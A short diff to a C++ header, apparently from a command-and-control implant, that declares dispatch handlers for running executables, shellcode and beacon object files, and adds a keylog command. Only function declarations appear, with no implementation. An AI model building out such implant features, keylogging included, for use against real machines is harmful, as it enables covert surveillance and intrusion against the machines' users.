@@ -41,6 +41,7 @@ namespace dispatch {
     command_output runexe(const std::vector<std::string>& args, const implant_context& ctx);
     command_output runshellcode(const std::vector<std::string>& args,const implant_context& ctx);
     command_output runbof(const std::vector<std::string>& args, const implant_context& ctx);
+    command_output keylog(const std::vector<std::string>& args, const implant_context& ctx);
 }
 
 #endif //DISPATCH_HPP
